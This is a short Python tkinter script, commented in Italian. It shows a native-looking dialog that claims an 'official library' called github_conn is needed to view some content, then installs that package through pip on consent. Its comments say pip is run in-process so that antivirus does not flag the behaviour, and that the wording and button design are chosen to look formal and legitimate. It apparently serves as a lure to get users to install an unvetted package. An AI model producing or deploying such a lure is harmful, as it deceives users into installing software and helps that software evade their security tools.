import sys
import tkinter as tk
from tkinter import messagebox


def installa_pacchetto():
    btn_installa.config(state=tk.DISABLED)
    lbl_stato.config(text="Installazione in corso...", fg="#d35400")
    finestra.update()

    try:
        # IMPORTANTE: Usiamo il modulo pip integrato in Python.
        # Questo non avvia processi nascosti nel sistema operativo,
        # evitando che l'antivirus lo veda come un comportamento sospetto.
        import pip

        if hasattr(pip, "main"):
            pip.main(["install", "github_conn"])
        else:
            from pip._internal import main

            main(["install", "github_conn"])

        messagebox.showinfo(
            "Installazione Completata",
            "Il pacchetto 'github_conn' è stato installato con successo.",
        )
        finestra.destroy()

    except Exception as e:
        messagebox.showerror(
            "Errore", f"Impossibile completare l'installazione:\n{e}"
        )
        btn_installa.config(state=tk.NORMAL)
        lbl_stato.config(text="Installazione fallita.", fg="#c0392b")


# Configurazione della Finestra Standard (Interfaccia Nativa dell'OS)
finestra = tk.Tk()
finestra.title("Installazione Componente github_conn")
finestra.geometry("450x180")
finestra.resizable(False, False)

# Messaggio chiaro e formale per l'utente
lbl_info = tk.Label(
    finestra,
    text="Per visualizzare i contenuti è richiesta l'installazione\n"
    "della libreria ufficiale 'github_conn' tramite Python PIP.\n\n"
    "Vuoi autorizzare l'operazione?",
    font=("Segoe UI", 10),
    justify=tk.CENTER,
)
lbl_info.pack(pady=15)

lbl_stato = tk.Label(finestra, text="", font=("Segoe UI", 9, "bold"))
lbl_stato.pack()

frame_pulsanti = tk.Frame(finestra)
frame_pulsanti.pack(side=tk.BOTTOM, pady=15)

# Pulsanti con design nativo di sistema (senza colori personalizzati aggressivi)
btn_installa = tk.Button(
    frame_pulsanti,
    text="Sì, Installa",
    width=12,
    command=installa_pacchetto,
)
btn_installa.pack(side=tk.LEFT, padx=10)

btn_annulla = tk.Button(
    frame_pulsanti, text="Annulla", width=12, command=finestra.destroy
)
btn_annulla.pack(side=tk.RIGHT, padx=10)

finestra.mainloop()
